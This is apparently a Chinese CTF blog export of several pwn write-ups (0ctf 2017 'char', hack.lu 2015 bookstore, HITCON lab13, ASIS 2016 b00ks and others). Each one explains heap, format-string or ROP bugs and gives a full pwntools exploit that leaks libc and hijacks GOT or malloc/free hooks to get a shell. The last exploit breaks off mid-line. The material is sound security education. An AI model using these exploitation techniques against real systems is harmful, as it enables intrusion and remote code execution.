p.sendline(str(index)) p.recvuntil('daily\n') p.send(payload)payload = '\x66'*0x200add(len(payload),payload) #index 0add(len(payload),payload) #index 1add(len(payload),payload) #index 2add(len(payload),payload) #index 3delete(1) #delete 1delete(2) #delete 2payload = '\x12'*8add(0x1a0,payload) #index 1 #------------------------------------------------利用large chunkl来leak libcbase和heapbase---------------------------------view()p.recvuntil('\x12\x12\x12\x12\x12\x12\x12\x12')main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - (0xf68-0xb20)log.success('main_arena_addr = '+hex(main_arena_addr))libcbase = main_arena_addr - (0x4be5b20-0x4821000)log.success('libcbase = '+hex(libcbase))payload = '\x12'*12+'\x21'*4upgrade(1,payload)view()p.recvuntil('\x21\x21\x21\x21')heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x210log.success('heap_addr = '+hex(heap_addr))#gdb.attach(p)#-----------------------------------------------leak success--------------------------------------payload = 'a'*8add(0x31,payload) #index 2 #------------------------------------------------prepare doublefree--------------------------------payload = p64(0)+p64(0x31) payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x20)payload+= p64(0)+p64(0x31)payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x50)payload+= p64(0)+p64(0x31)upgrade(0,payload)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index)index = (heap_addr + 0x60 - 0x602060)/0x10delete(index)payload = p64(0)+p64(0x31) payload+= p64(0)*2payload+= p64(0x20)+p64(heap_addr+0x20)payload+= p64(0)+p64(0x31)upgrade(0,payload)index = (heap_addr + 0x30 - 0x602060)/0x10delete(index)#-----------------------------------------------double free success--------------------------------payload = p64(0x602078) add(0x20,payload) #index 3free_hook = libcbase + (0x1728f7a8 - 0x16ec9000)log.success('free_hook = ' + hex(free_hook))payload = p64(free_hook)add(0x20,payload) #index 4add(0x20,payload) #index 5add(0x20,payload) #index 6one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]upgrade(2,p64(one_gadget[1]+libcbase))delete(4)p.interactive() 0x36 收货：可能需要对free()的检查机制了解的比较深入才能得心应手的快速解出这一题，我第一遍因为思路不清晰导致不知道改了一个什么东西总是报错，第二遍整理一下思路才Pwn掉，挺丢人的。。。。。题目出的稳中有活，难度也适合像我这种初学者，感觉出的不错。。。。&gt;_&lt;. 0x4 第二天_double:0x41 程序功能分析：首先看一下程序的基本信息：64位，relro为paril，没开PIE，看题目的名字猜是double free….(但实际上最后我没用上double,只用了uaf来构造fake_chunk….orz) 放进ida看一下：程序是按照链表的形式表现的，之前做过一个类似的链表的题目。。。感觉比这个难一点。。首先head_ptr和prev_ptr都清零。。(这里变量我已经rename了，所以看着好理解一点，开始自己看的时候还是需要看一会) 之后程序有4个功能，new()，show()，edit()，delete()： 分析程序功能以后，new()大概功能就是在堆上申请一个chunk_header(总大小为0x20，之中储存了content的size和chunk的index，，以及自己的content的地址和上一个chunk的chunk_header的地址。)，然后先将我们的输入储存在一个缓冲区，然后比较其内容和上一个chunk的content是否一样，如果一样话，就不再用malloc()申请新的chunk，而是将其的content地址直接指向上一个chunk的content地址，若不一样的话就再malloc()一块和我们输入大小一样的chunk。 show()的功能为输入下标然后遍历chunk链表找到下标符合的chunk然后以字符串的形式打印其content内容（\x00截断） edit()的功能为输入下标然后遍历chunk链表找到下表合适的chunk然后比较我们输入的centent大小和之前的大小，若比其小则直接在原content处覆盖，若比其大则再malloc()一块chunk。 delete()的功能为输入下标然后遍历chunk链表知道下标合适的chunk然后先释放其content指针，再释放其chunk_header指针。需要注意的是这个程序是一旦delete()一个下标之后，这个下标将不再存在，下一次再申请是继续往后延伸的下标，不会找已经已经free()的小的下标。细节不要搞错了。。。 0x42 漏洞寻找：先找了一会，没有发现溢出漏洞。。。然后开始考虑 uaf 和 double free，利用glibc的机制来leak和构造fake，然后发现如果申请两个内容相同的chunk时，然后delete()其中一个，但另外一个仍然可以对已经放进bins的原先装content的那个chunk进行读写操作。。。思路开始变得清晰。。。 0x43 漏洞利用：首先我们申请一个大小范围在fastbin之外（总大小大于0x80）的chunk，然后进行uaf的读操作泄露出libc，之后再申请小的chunk，这些小的chunk和他们的chunk_header都会被分配在uaf的区域（因为其原先在unsortedbin中），然后我们可以通过uaf的写入功能更改新chunk_header的content指针为free_got的地址，并且先在堆中写入’/bin/sh\x00’，然后通过新chunk的upgrade功能将free_addr改为system_addr，然后再申请一个新的小chunk，其header应该还是在uaf区域，然后通过uaf的写入修改其content指针为‘/bin/sh\x00’字符串的地址（我们之前已经写在了堆上，所以我们需要泄露heap的地址！！方法类似，在最开始的时候申请一个大小在fastbin范围内的chunk然后进行uaf，利用uaf的读功能泄露heap地址。），最后delete()最后申请的那个chunk即可，在free(content指针)时就等于调用了system(‘/bin/sh\x00’)。 0x44 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./pwn')P = ELF('./pwn')def new(payload): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('data:\n') p.sendline(payload)def edit(index,payload): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(index)) p.sendline(payload)def delete(index): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil('index: ') p.sendline(str(index))def list_(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('index: ') p.sendline(str(index))new('\x11'*0xf) #index 0 new('\x11'*0xf) #index 1 0和1共用content chunknew('\x22'*0x7f) #index 2new('\x22'*0x7f) #index 3 2和3共用content chunknew('\x44'*0xf) #index 4 防topchunk合并#gdb.attach(p)delete(3)#-------------------------------------leak libcbase and system_addr and heap-----------------------list_(2)main_arena_addr = u64(p.recv(6).ljust(8,'\x00')) - 88log.success('main_arena = '+hex(main_arena_addr)) libcbase = main_arena_addr - (0xdd8b20-0xa14000)log.success('libcbase = '+hex(libcbase))system_addr = libcbase + (0xbab390 - 0xb66000)log.success('system_addr = '+hex(system_addr))#gdb.attach(p)delete(1)list_(0)heap_addr = u64(p.recv(4).ljust(8,'\x00')) - 0x110log.success('heap_addr = '+hex(heap_addr))#--------------------------------------leak success------------------------------------------------new('\x55'*0xf) #index 5new('\x66'*0xf) # 6new('\x77'*0xf) # 7new('\x88'*0xf) # 8payload = '/bin/sh\x00'payload+= '\x55'*0x10payload+= p64(0x21)payload+= '\x07'+'\x00'*3+'\x0f'+'\x00'*3payload+= p64(P.got['free'])payload+= p64(heap_addr+0xf0)payload+= p64(0x21)payload+= '\x22'*0x18payload+= p64(0x31)payload+= '\x08'+'\x00'*3+'\x0f'+'\x00'*3payload+= p64(heap_addr+0x90) #“/bin/sh\x00”的地址。edit(2,payload)payload = p64(system_addr)edit(7,payload)delete(8)p.interactive() 0x45 收货：感觉挺有趣的，链表形式的题目还是很有趣，觉得无论是doublefree还是什么，对glibc的机制了如指掌才是真正的王道。。。对每一块chunk的来源和去向和他们什么时候该有什么内容都在心中清楚才能最快的找到思路并且在调试上节约时间。。。这一题最后是100p，比daily还高，可能考的堆机制的理解更深一点吧。。。。 补更：后两题记个日期：现在已经是2019年9月15日了hhhhh，强迫症想到还有两题没填坑，回去看一下。 ps：现在看预赛题真的简单。。。orz bms:emmm像个弱智题。。。服了，前面的密码过了以后，后面就是弱智题，五分钟解决。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'],timeout = 0.1)#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;\n') p.sendline('1') p.recvuntil('name') p.send('\x00'*0x10) p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('tion:') p.send(content)def delete(index): p.recvuntil('&gt;\n') p.sendline('2') p.recvuntil('index:') p.sendline(str(index))p.recvuntil('name:')p.sendline('admin')p.recvuntil('word:')p.sendline('frame')new(0x30,'\x00'*0x30) #0delete(0)delete(0)stdout = 0x602020new(0x30,p64(stdout)) #1new(0x30,'\x00'*0x30) #2new(0x30,'\x60') #3payload = p64(0xfbad1800) + p64(0)*3 + '\x00'new(0x30,payload) #4p.recv(8)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f55658d58b0 - 0x7f55654e8000)log.success('libcbase = '+hex(libcbase))new(0x40,'\x00'*0x40) #5delete(5)delete(5)new(0x40,p64(libcbase+libc.sym['__free_hook'])) #6new(0x40,'/bin/sh\x00'+'\x00'*0x28) #7new(0x40,p64(libcbase+libc.sym['system'])) #8delete(7)if attach == 1: gdb.attach(p)p.interactive() Virtual:exp如下：12]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017-0ctf-char-writeup]]></title>
    <url>%2F2019%2F04%2F13%2F2017-0ctf-char-writeup%2F</url>
    <content type="text"><![CDATA[首先提供题目的二进制文件2017-0ctf-char。 预览：拿到题目先预览，发现程序为32位且保护很少，估计应该是栈题，运行一下发现程序似乎很简单。。。放进ida看一下反汇编码，发现程序确实不难，但是有几个需要注意的地方。 我们可以看到程序将libc通过mmap()映射到了固定的0x5555e000处，这等于我们不需要泄露libc就可以确定函数和gadgets的真实地址，带来了极大的方便。比较麻烦的是程序有一个check的函数，检查每个字符必须为可见字符（16进制的大小范围为0x1f~0x7e）,但我们又发现，他的v1是由strlen()确定的，我们可以通过scanf()只看空格和回车结束来输入’\x00’使其提前结束。。。。。但我们又发现了一个问题。。。就是在漏洞函数中我们的strcpy也是通过’\x00’来判断的。这就很让人蛋疼。。。。这就是说我们通过strcpy()复制到漏洞点的字符串就是我们截断前的那一小段。。。。 漏洞寻找和分析：很明显有一个漏洞函数，通过strcpy()造成溢出。这个不难发现，难点在于check()给我们的rop链造成了很大的障碍。check的存在注定我们复制到溢出点的数据长度不可能太长，但无论我们是调用函数并且给函数准备参数还是gadgets都需要占用不少的位置，这几乎是不可能成功的。如下图可见一点： system()和execve()都过不了检查。。。我们能想到的就是我们必须在小的溢出数据范围内调用一些gadgets而使esp迁移到main的栈数据区域(我们的复制源)，而不能在漏洞函数里卡死，迁移到源数据后这题就变得很简单。难点在于gadgets的合适选择和寻找。 漏洞利用：我是通过观察strcpy()之后发现ecx似乎一直指在源数据的中间固定区域（相对偏移不变），所以想到使ecx的值赋给esp使esp直接跳转，但是通过搜索gadgets发现只能通过 mov eax,ecx; ret; xchg eax,esp; ret b; 来实现紧接着再通过具体的细节调整使跳转过后的esp指向addr_pop_ebx为int 0x80准备参数，准备调用execve(‘/bin/sh’,0,0)。具体细节还得自己验证。 exp如下：(调用函数实现的就不写了，请自己调试尝试)12345678910111213141516171819202122232425262728293031323334353637383940414243#coding:utf-8from pwn import *p = process('./char')context(os='linux',arch='i386')#context.log_level = 'debug'p.recvuntil('GO : ) \n')base = 0x5555e000sh_addr = 0x15D7EC#pop_ebx = 0x109D07 xor_eax_pop_ebx = 0x7dce9pop_ecx = 0xcae3bpop_edx = 0x1a9eint_0x80 = 0x2df35inc_eax = 0x26a9bnop_xor_eax = 0x7403axchg_eax_esp_retb = 0xe6d62mov_eax_ecx = 0x148253payload = 'a'*0x1cpayload+= p32(mov_eax_ecx+base) payload+= p32(mov_eax_ecx+base)payload+= p32(xchg_eax_esp_retb+base)payload+= '\x00'*3payload+= p32(xor_eax_pop_ebx+base)payload+= p32(sh_addr+base)payload+= p32(pop_ecx+base)payload+= p32(0)payload+= p32(pop_edx+base)payload+= p32(0)#payload+= p32(nop_xor_eax+base) nop_xor_eax+base=0x555d203a '\x20'空格字符会将在scanf()读的时候将payload截断.for i in range(11): payload+= p32(inc_eax+base)payload+= p32(int_0x80+base)pause()#gdb.attach(p)p.sendline(payload)p.interactive() 收货： gadgets的寻找：通过ROPgadgets –binary *** &gt; gadget 然后再在文件gadget里通过查找功能查找。（再次感谢川大的师傅 orz ） ret x 的意义是 eip 跳转之后esp = esp+4+x。 scanf( ) 看回车和空格结束，str( )系列函数看 ‘\x00’ 结束。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2015-hacklu-bookstore]]></title>
    <url>%2F2019%2F04%2F01%2F2015-hacklu-bookstore%2F</url>
    <content type="text"><![CDATA[首先提供题目的二进制文件：2015_hacklu 预览： 程序为64位，然后没有relro，没有pie，给调试带来很大方便。放进ida看看基本功能： 可以看到程序开始的时候已经在堆申请了三个堆块，且大小固定为0x80。 这里感觉怪怪的，s可以输入0x80个字符。。。。应该会有用处。 可以看到程序最后有一个格式化字符串漏洞，我们通过经验得知，通过精心构造格式化字符串可以实现任意地址读写功能。所以我们的问题关注点应该暂时放到如何构造格式化字符串中。 接着往下看，看完后发现实际上程序功能很简单，就两个小功能，一个输入任意字节的输入功能，一个free()功能（uaf没什么用。）。 暂时有用的漏洞就是格式化字符串漏洞和任意溢出漏洞。 漏洞如何利用： 以格式化字符串漏洞为主线索来逆向推理分析，如何控制dest？？？，我们发现程序中好像没有可以控制dest的功能（任意溢出漏洞虽然可以覆盖到，但是之后dest会被更新为固定的字符串）。。。真让人头秃，只有自己构造了。。。。然后发现最后一个功能里的v5指向的chunk的位置还未固定（malloc()从bins里找chunk，而bins里的chunk是可控的），所以我们可以利用任意溢出漏洞更改v7指向的chunk的大小为0x150，然后free()，再通过程序的malloc(0x140)来实现chunkoverlapping，从而使v5指向的地址位于dest地址前面，然后利用填充v5的机会构造dest。这里还需要注意的地方是free(2)的时候，因为大小属于small chunk所以会有两道检查，一个是防止和后一块合并，所以必须伪造后后一块，并使其prev_inuse位为1，另一个是后一块的prev_inuse位要为1。 相信大家都能注意到，就是程序运行了一次就结束了，而我们至少需要两次运行，一次leak，一次change，所以这里需要利用第一次的机会来将fini_arry0改为main_addr，并且泄露libc地址（main函数返回到__libc_start_main中，可以在格式化字符串前来下断点，通过查看栈的数据来查看偏移，进而获得libc地址。），现在还有一个问题是fini_arry0怎么输入进栈并且确定偏移？？？这里需要打破常规思维，需要改的数据可以不在格式化字符串里，只要偏移可以确定就行！，这时候就想到了之前的那个s给了0x80的空间，我们可以将fini_arry0输入到s里然后通过调试确定偏移。 如果我们这时候继续往下做的时候做到最后会发现一个问题：改过got表之后程序已经几乎结束，不会再调用函数了，所以改了也没用，所以我们只能改main函数返回地址为one_gadget了，这时候我们就要确定泄露一个和返回地址的地址相对偏移不变的值，经过观察发现有一个存在，然后泄露他。 第二次返回时我们的任务就变成了改ret_addr为one_gadget即可。只需要改后面的三个字节即可（可通过调试发现）。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from pwn import *context(arch='amd64',os='linux')#context.log_level='debug'p=process('./books')P=ELF('./books')libc=ELF('./libc.so.6')#gdb.attach(p,'b *0x400c8e')#创建各个函数def edit(ID,des): p.recvuntil('5: Submit\n') p.sendline(str(ID)) p.recvuntil('er:\n') p.sendline(des)def delete(ID): p.recvuntil('5: Submit\n') p.sendline(str(ID+2))def submit(payload): p.recvuntil('5: Submit\n') p.sendline('5'+payload)#先构造chunk1造成over lapping 并且构造dest 两个目的：1.泄露__libc_main_ret#2.将fini_arry0改为main_addrfini_arry0=0x6011b8 #0x400830main_addr=0x400a39payload = '%'+str(0xa39)+'c%13$hn'+'.%31$p'+',%28$p'payload = payload.ljust(0x74,'a')payload = payload.ljust(0x80,'\x00')payload+= p64(0x90)payload+= p64(0x151)payload+= 'a'*0x140payload+= p64(0x150) payload+= p64(0x21) #为了bypass the check: !prev_inuse(next_chunk)payload+= 'a'*0x10payload+= p64(0x20)+p64(0x21) #为了使0x150的块不和nextchunk合并 #delete(2)edit(1,payload)delete(2)submit('aaaaaaa'+p64(fini_arry0))#submit('aaaaaaa')#gdb.attach(p)p.recvuntil('.')p.recvuntil('.')p.recvuntil('.')date = p.recv(14)p.recvuntil(',')ret_addr = p.recv(14)date =int(date,16) - 240ret_addr = int(ret_addr,16) - 0xd8 -0x110libcbase = date - libc.symbols['__libc_start_main']one_gadget = libcbase + 0x45216 #0x4526a 0xf02a4 0xf1147log.success('ret_addr = ' + hex(ret_addr))#raw_input()one_shot1 ='0x' + str(hex(one_gadget))[-2:]one_shot2 ='0x' + str(hex(one_gadget))[-6:-2]one_shot1 = int(one_shot1,16)one_shot2 = int(one_shot2,16)payload = '%' + str(one_shot1) + 'd%13$hhn'payload+= '%' + str(one_shot2-one_shot1) + 'd%14$hn'payload=payload.ljust(0x74,'a')payload=payload.ljust(0x80,'\x00')payload+=p64(0x90)payload+=p64(0x151)payload+= 'a'*0x140payload+= p64(0x150)payload+= p64(0x21)payload+= 'a'*0x10+p64(0x20)+p64(0x21)#delete(2)edit(1,payload)delete(2)submit('aaaaaaa'+p64(ret_addr)+p64(ret_addr+1))p.interactive() 我第一次做的时候的一些心得：2015_hacklu_bookstore: 这一题看似漏洞较多，但实际上难度不小，而且知识比较综合（有格式化字符串，堆栈的结合，overlapping，uaf等），利用起来很困难，费了很大劲才弄懂exp。还要感谢看雪的师傅。 学到的东西： 使程序再次运行的方法：改写fini_arry0的内容（一般在.fini_arry段中，在ida中ctrl+s寻找位置）为main_addr，可以再次运行，但只能用一次。 ida中使数字解析为字符串的方法，按r即可。 free(fast_bin（64位的极限是0x70）)时不需检查，而free(small_bin(64位是大于等于0x80))时，需要考虑几个因素： @1有可能会需要占位的堆块，防止被top chunk合并。 @2可能会造成unlink效应，注意构造时的size的inuse位，检查prev_chunk的占用情况，如果要unlink，两个堆块都要在small_bin的范围内。 @3会检查next_chunk(prev_inuse)的值是否为1,而next_chunk_addr=chunk_addr+chunk_size，chunk_size为自己构造，需注意。 利用overlapping构造格式化字符串来造成任意读写，得知偏移后提前构造栈的结构。 当通过格式化字符串获取任意写的功能时，除了向got表内写，还可以改写函数的返回地址为one_gadget（当然不一定能成功），这时就需要获取返回地址的地址，也就是栈中的某一个的地址，一般需要通过观察栈中数据是否有指向栈的并且和返回地址有固定的偏移，泄露其数值加上偏移即可得到返回地址的地址。 格式化字符串用%p打印出来的内容无需解包直接接受即可（所有内容都是字符，比如：0x600124则需要data=int(p.recv(8),16)），%s需要解包(接受时是以字符接受的，0x600124为data=u64(p.recv()[0:3].ljust(8,’\x00’)))。 [-2:]和[-2:0]的区别。。。 当利用改fini_arry0为main_addr而使程序再次回到开头时，程序的两次返回地址之间有一个固定的偏移。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitcontraning_lab13_writeup]]></title>
    <url>%2F2019%2F03%2F31%2Fhitcontraning-lab13-writeup%2F</url>
    <content type="text"><![CDATA[依然是wiki上的例题，先提供二进制源码：hitcontraning_lab13 预览： 文件是64位，partial relro则可以改写got表，感觉就像是堆题（名字也叫heapcreator）。。。没有pie调试起来会方便很多。。。然后放进ida64看一下大致功能。 前言分析：首先有两个setvbuf()设置好了标准输入和标准输出的缓冲区，所以程序不会在heap段设置chunk，然后打印一个菜单，之后就输入一个字符串，然后通过atoi()函数将字符串转换成数字，（这里可以想到如果将atoi_got改为system_addr后，直接输入‘/bin/sh\x00’就可以拿shell了），但是不幸的是他只可以输入4个字节。。。。但这一点后面能用上。 程序主要功能分析（寻找漏洞）：首先有四个主功能：create()，edit()，delete()，show()，当我们看到有edit和show存在的时候，这一题多半不会难，因为这两个函数为我们的泄露和篡改打下了基础，之后开始逐个分析。。 在create()中我们可以发现当输入size的时候调用atoi()的时候可以输入8个字符串！！！nice，我们的设想得到了成立！所以我们的目标设为改写atoi_got为system_addr。 在edit()功能中发现了off-by-one漏洞，通过这个我们可以实现chunk overlapping。 show()则是正常的打印内容。 delete()函数知识正常将chunk放入Bins，然后将指针归零，没有uaf漏洞。 利用漏洞来实现功能：leak: 想要leak出libc，先考虑常用的泄露got表地址，因为show()功能是打印heap的content指针所指向的内容，所以想办法将content指针改为atoi_got，然后再show就可以泄露出Libc。 利用chunk overlapping来进行chunk的覆盖重叠，申请两个chunk，第一个chunk的作用是来改第二个heap结构体的大小（可以设计好使其正好和top_chunk接轨就省去了nextchunk的prev_inuse检查，例如我是申请一个content大小为0x10的chunk，然后将heap结构体的大小改为0x40），然后delete以后其会被放入对应的fastbin中，然后再申请与其大小对应（0x30）的heap，使heap结构体0x10申请到的内存位于之前content位于的地方。这就形成了覆盖。（经典的与unlink类似的，我改我自己形式，即通过漏洞利用使一个结构体中的一个指针指向自己地址前方的不远处，通过向那个地址编辑内容来达到修改自己的目的。）如下图所示： 这就可以利用edit功能来改heap结构体的content指针。接着可以实现任意地址写的功能。 change: 泄露出libc以后就可以获得system_addr，然后利用任意地址写的功能将atoi_got改为system_addr，然后就利用之前说的方法来拿shell。 exp如下：两种思路，只讲了第一种，第二种类似，只不过利用的是free(addr_’/bin/sh\x00’)： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'p = process('./heapcreator')P = ELF('./heapcreator')libc = ELF('./libc.so.6')atoi_got=P.got['atoi']#创建函数def create(size,payload): p.recvuntil(':') p.sendline('1') p.recvuntil(': ') p.sendline(str(size)) p.recvuntil(':') p.send(payload)def edit(ID,payload): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(ID)) p.recvuntil(': ') p.send(payload)def show(ID): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(ID))def delete(ID): p.recvuntil(':') p.sendline('4') p.recvuntil(':') p.sendline(str(ID))payload='a'*0x18create(0x18,payload)payload='a'*0x10create(0x10,payload)payload='a'*0x18+p8(0x40)edit(0,payload)delete(1)payload='a'*0x10 create(0x30,payload)#gdb.attach(p)payload='a'*0x10+p64(0)+p64(0x21)+p64(0x30)+p64(atoi_got)edit(1,payload)#gdb.attach(p)show(1)p.recvuntil('Content : ')atoi_addr = u64(p.recv(6).ljust(8,'\x00'))log.success('atoi_addr=' + hex(atoi_addr))#gdb.attach(p)libcbase = atoi_addr - libc.symbols['atoi']log.success('libcbase=' + hex(libcbase))system_addr=libcbase + libc.symbols['system']payload=p64(system_addr)edit(1,payload)p.recvuntil(':')p.sendline('1') p.recvuntil(': ')p.sendline('/bin/sh\x00')p.interactive() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#coding:utf-8from pwn import *context(os='linux',arch='amd64',timeout=1)p = process('./heapcreator')P = ELF('./heapcreator')libc = ELF('./libc.so.6')free_got=P.got['free']#创建函数def create(size,payload): p.recvuntil(':') p.sendline('1') p.recvuntil(': ') p.sendline(str(size)) p.recvuntil(':') p.sendline(payload)def edit(ID,payload): p.recvuntil(':') p.sendline('2') p.recvuntil(':') p.sendline(str(ID)) p.recvuntil(': ') p.sendline(payload)def show(ID): p.recvuntil(':') p.sendline('3') p.recvuntil(':') p.sendline(str(ID))def delete(ID): p.recvuntil(':') p.sendline('4') p.recvuntil(':') p.sendline(str(ID))#先创建两个堆块，让前面的off-by-one后面的create(0x18,'a'*4)create(0x10,'a'*4)edit(0,'/bin/sh\x00'+'a'*0x10+'\x41')#往fastbin送块delete(1)#再申请，使content覆盖heaparry[1]结构体的内容create(0x30,p64(0)*4+p64(0x30)+p64(free_got))#泄露libcshow(1)p.recvuntil('Content : ')free_addr=u64(p.recv()[0:6].ljust(8,'\x00'))log.success('free_addr=' + hex(free_addr))libcbase=free_addr-libc.symbols['free']system_addr=libcbase+libc.symbols['system']#将system_addr写入free_got里edit(1,p64(system_addr))delete(0)p.interactive() 我第一次做的时候的一些心得：hitconingtraining_lab13: 这一题难度不大，但是还是没有独立做出来，需要再独立处理一遍。 常见套路，申请书籍，然后用结构体储存书籍内容的指针和大小，结构体在堆上，书籍内容申请的空间也在堆上。 有edit和print功能说明不难，用edit向书籍的内容指针里任意写，所以想办法将内容指针改为free_got，再调用edit功能将其内容改为system_addr。 然后想改书籍的内容指针则需要控制结构体堆块，溢出和chunk overlapping都可以，溢出找不到，则为后者。 利用off_by_one漏洞和fast_bin的机制，更改size of 第二本书结构体堆块，用第二本书的内容控制结构体堆块内容，更改其为free_got，然后edit书籍二。 再考虑’/bin/sh’的位置，放在书籍一的内容里比较合适。system(addr_/bin/sh)，因为内容为/bin/sh所以free(ptr_des)的时候正好为system(addr__ /bin/sh)。]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016-Asis-books_writeup]]></title>
    <url>%2F2019%2F03%2F31%2F2016-Asis-books-writeup%2F</url>
    <content type="text"><![CDATA[wiki上的一道经典例题，写wp的目的一方面是wiki上一些细节讲的有点不太清楚，一方面是自己巩固一下做过的题目，看是否是真的掌握。 首先提供题目二级制文件链接：books 预览：拿到题目先看基本信息： 可以看到题目是64位文件，所有保护全开，一般这种题目是堆题，且看到full relro则大概率是篡改malloc_hook。 然后运行一下，找到程序运行入口，然后放入ida里看反汇编码： 准备功能分析：（不要忽视，做的题多了会发现有时候这里可能存在关键漏洞）这里因为我已经做过了，所以函数名和一些变量名已经被我改成了对应的功能，可以看到程序开头先打印欢迎语，然后让我们输入作者（字符串储存在bss段，是可控的），这里的输入函数存在off-by-null漏洞，当输入32个字符时，既可以用来change，又可以用来leak(因为字符串后面没有‘\x00’，所以可以泄露authername这个字符串之后的内容直到’\x00’，这也是常见的套路。。。) 程序主功能分析：程序有五个功能：1.create 2.delete 3.edit 4.print 5.change_authorname，大致的整体功能实现就是用户申请书本，然后书的名字和内容大小都由我们自己来定，并将它们的内容存放在堆上，然后创建一个大小固定的Book结构体来储存被创建的book的信息，其也放在堆上，创建一个book以后堆上的结构和bss段的联系大概如下图所示： 紧接着删除功能删除booklist中的Book指针，并且将指针归0，没有uaf漏洞 然后edit功能就是将Book的des重新输入，没有漏洞 然后是print功能，打印书的ID,name,des和书的作者，这个漏洞之前提过，分析bss段的结构就可以发现打印作者使可以泄露第一个book指针，这里需要注意，因为之后的所有chunk大小我们都可以自己控制，所以经过简单的计算，就等于我们泄露了所有的book指针和name,des指针！！！这是解题的一个关键之处。 再之后是change_authorname功能，就是更改作者的名字，当输入32个字节时依然存在off-by-null漏洞（因为是off-by-null,不是off-by-one，所以难度会有所加大）。 漏洞利用思路：leak: 在前面已经提过，利用authorname最后一个字符’\x00’被book指针覆盖所以可以泄露book1指针的值，从而泄露之后所有的指针。 难点在于怎样泄露Libc，这里有一种新的方法，适用于chunk大小我们自己可控并且其地址可以泄露的情况，我们把book2的name和des申请的大于128KB（0x20000），则ptmalloc2将会用mmap来为我们分配内存，然而mmap的地址和libc的地址相对偏移不变（经过一次调试就能确定偏移），所以我们只要泄露了book2的name地址就等于泄露了libc，那再思考怎样泄露book2的name地址呢？现阶段我们只能利用程序自带的打印功能，他将打印所选的book的name指针和des指针所指向的内容，由book1指针已经由于off-by-null而最后一个字节被变为00，其之前肯定大于0，因为内存的分页分配机制，所以想让其被改过后的book1指针落入book1的des中，book1的des要相对的大一点。。。并且利用edit功能来重新编写book1的des，在book1指针指向的那个地方（这里的偏移不变，通过调试确定）伪造一个fake_book2_struct，其name指针为book2的name指针的地址（为addr_book1+56），然后利用打印功能来leak出book2的name指针的值，Libc泄露成功！！！ change:利用程序自带的edit功能来改malloc_hook为one_gadget（one_gadget需要多次尝试），因为我们已经可以掌控book1的des指针的值了，所以也就实现了任意地址写入。之后再次申请的时候就会触发malloc_hook拿到shell。 exp如下（我当时做的时候是改free_hook，具体的一些偏移量需要自己调试来确定，exp只提供思路！！！）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *context(os = 'linux',arch = 'amd64')context.log_level = 'debug'p=process('./b00ks')P=ELF('./b00ks')libc=ELF('./libc.so.6')#先创建每个函数def create(name_size,name,des_size,des): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil(': ') p.sendline(str(name_size)) p.recvuntil(': ') p.sendline(name) p.recvuntil(': ') p.sendline(str(des_size)) p.recvuntil(': ') p.sendline(des)def delete(ID): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil(': ') p.sendline(str(ID))def edit(ID,des): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil(': ') p.sendline(str(ID)) p.recvuntil(': ') p.sendline(des)def printf(ID): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil(': ') for i in range(ID): book_id=p.recvline()[:-1] p.recvuntil(': ') book_name=p.recvline()[:-1] p.recvuntil(': ') book_des=p.recvline()[:-1] p.recvuntil(': ') book_author=p.recvline()[:-1] return book_id,book_name,book_des,book_authordef change(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil(': ') p.sendline(name)#创建两个书本p.recvuntil(': ')p.sendline('a'*32)create(8,'a'*4,1024,'a'*8)create(0x21000,'b'*4,0x21000,'b'*8)#泄露第一个书本的地址book1_id,book1_name,book1_des,book1_author = printf(1)book1_addr=u64(book1_author[32:32+6].ljust(8,'\x00'))log.success('book1_addr=' + 